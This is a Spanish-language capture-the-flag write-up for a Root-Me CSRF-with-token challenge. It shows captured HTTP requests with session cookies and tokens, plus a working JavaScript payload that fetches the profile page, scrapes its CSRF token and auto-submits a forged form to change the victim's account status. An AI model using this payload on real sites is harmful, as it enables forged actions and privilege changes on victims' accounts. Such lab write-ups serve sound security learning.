Nos damos cuenta que este CTF es el mismo que CSRF — 0 Protection - Rootme, con la difrencia que aca se agrega un token CSRF en la seccion de contactos

```burp
POST /web-client/ch23/?action=contact HTTP/1.1
Host: challenge01.root-me.org
Content-Length: 51
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36
Origin: http://challenge01.root-me.org
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://challenge01.root-me.org/web-client/ch23/?action=contact
Accept-Encoding: gzip, deflate, br
Accept-Language: es-ES,es;q=0.9
Cookie: PHPSESSID=98bdb423da9bbdfe77b92af08fc3bca7; _ga=GA1.1.969120155.1790606498; _ga_SRYSKX09J7=GS2.1.s1791985802$o13$g1$t1791987825$j22$l0$h0
Connection: keep-alive

content=hola&token===🟡ec1dc0df2a0d2c7f95154f047ea7d013==
```

Tambien se observo que en la peticion GET de /profile se brinda el token en la respuesta

```burp
HTTP/1.1 200 OK
Server: nginx
Date: Wed, 14 Oct 2026 14:24:21 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Vary: Accept-Encoding
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 1018

<html>
<head>
<title>Intranet v2</title>
</head>
<body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
<a href="?action=contact">Contact</a> | <a href="?action=profile">Profile</a> <!--| <a href="?action=search">Search</a> -->| <a href="?action=private">Private</a> | <a href="?action=logout">Logout</a><hr>
<br><br><div>
			<fieldset><legend>Update Profile</legend>
			<form id="profile" action="?action=profile" method="post" enctype="multipart/form-data">
			<div>
			<label>Username:</label>
			<input id="username" type="text" name="username" value="hacker">
			</div>
			<br>		
			<div>
			<label>Status:</label>
			<input id="status" type="checkbox" name="status" disabled >
			</div>
			<br>
			<input id="token" type="hidden" name="token" value="==🟡2232c08cd1a7bcc3a21a1455b0dd7410==" />
			<button type="submit">Submit</button>
			</form></fieldset>
			</div>
</body>
</html>
```

Tambien se observa como comentario /search, al cual se le puede hacer XSS, pero no es relevante para el desarrollo del CTF

![[Pasted image 20261014101924.png]]

![[Pasted image 20261014101946.png]]

Construimos el payload para que solicite el /profile, obtenga la respuesta, extraiga el token y lo ingrese en el form que estamos enviando

```payload
<form name = "mixxdz" action = "http://challenge01.root-me.org/web-client/ch23/?action=profile" method = "post" enctype = "multipart/form-data">
<input type = "hidden" name = "username" value = "hacker">
<input type = "hidden" name = "status" value = "on">
<input id = "admin-token" type = "hidden" name = "token" value = "">
</form>

<script>
request = new XMLHttpRequest();
request.open("GET", "http://challenge01.root-me.org/web-client/ch23/?action=profile", false);
request.send(null);
var response = request.responseText;
var groups = response.match("token\" value=\"(.*?)\"");
var token = groups[1];
document.getElementById("admin-token").value = token;
document.mixxdz.submit();
</script>
```

![[Pasted image 20261014103033.png]]

![[Pasted image 20261014104536.png]]
